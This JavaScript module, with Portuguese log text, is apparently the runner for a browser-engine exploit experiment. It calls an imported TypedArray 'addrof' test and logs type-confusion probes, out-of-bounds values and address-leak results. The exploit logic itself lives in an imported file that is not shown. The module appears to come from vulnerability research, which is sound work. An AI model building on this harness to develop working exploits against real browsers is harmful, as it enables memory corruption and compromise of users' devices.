// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 17)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R17, // <<<< NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R17"; 
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R17(); 
    // ... (lógica de processamento de resultado como na R14, adaptando logs para R17) ...
    if(result.errorOccurred){logS3(` RUNNER R17: ERRO: ${result.errorOccurred}.`,"critical",FNAME_RUNNER);document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R17: ERR!`;}
    else if(result){logS3(` RUNNER R17: Concluído.`,"good",FNAME_RUNNER);logS3(` RUNNER R17: Melhor OOB: ${result.oob_value_of_best_result||'N/A'}`,"info",FNAME_RUNNER);logS3(` RUNNER R17: Sonda TC: ${result.tc_probe_details?JSON.stringify(result.tc_probe_details):'N/A'}`,"leak",FNAME_RUNNER);
    const tcOK=result.heisenbug_on_M2_in_best_result;const coreAddrOK=result.addrof_A_result?.success;const getterAddr=result.addrof_A_getter_details;const directAddr=result.addrof_B_result;
    logS3(` RUNNER R17: TC Sonda: ${tcOK?"CONFIRMADA":"NÃO"}`,"vuln",FNAME_RUNNER);
    if(result.addrof_A_result)logS3(` RUNNER R17: Addrof Core: ${result.addrof_A_result.msg} (Val: ${result.addrof_A_result.value}, Dbl: ${result.addrof_A_result.raw_double})`,coreAddrOK?"vuln":"warn",FNAME_RUNNER);
    if(getterAddr)logS3(` RUNNER R17: Addrof Getter TC: ${getterAddr.msg} (Val: ${getterAddr.value})`,getterAddr.success?"vuln":"warn",FNAME_RUNNER);
    if(directAddr)logS3(` RUNNER R17: Addrof Direct TC: ${directAddr.msg} (Val: ${JSON.stringify(directAddr.value)})`,directAddr.success?"vuln":"warn",FNAME_RUNNER);
    if(coreAddrOK)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R17: AddrofCore OK!`;else if(tcOK)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R17: TC OK, Addr Fail`;else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R17: No TC`;
    if(result.iteration_results_summary?.length>0){result.iteration_results_summary.forEach((s,i)=>{logS3(` Iter ${i+1}(${s.oob_value}):TC=${s.heisenbug_on_M2_this_iter},CoreOK=${s.addrof_A_core_this_iter?.success??'N/A'},GetterOK=${s.addrof_A_getter_this_iter?.success??'N/A'}${s.error?`,Err:${s.error}`:''}`,"info",FNAME_RUNNER);});}}
    else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R17: Invalid Res`;}
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_MainOrchestrator_R17`; 
    logS3(`==== INICIANDO Script 3 R17 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim();
    logS3(`\n==== Script 3 R17 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL)&&!document.title.includes("SUCCESS")&&!document.title.includes("Fail")&&!document.title.includes("OK")&&!document.title.includes("Confirmed")){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R17 Done`;}
}
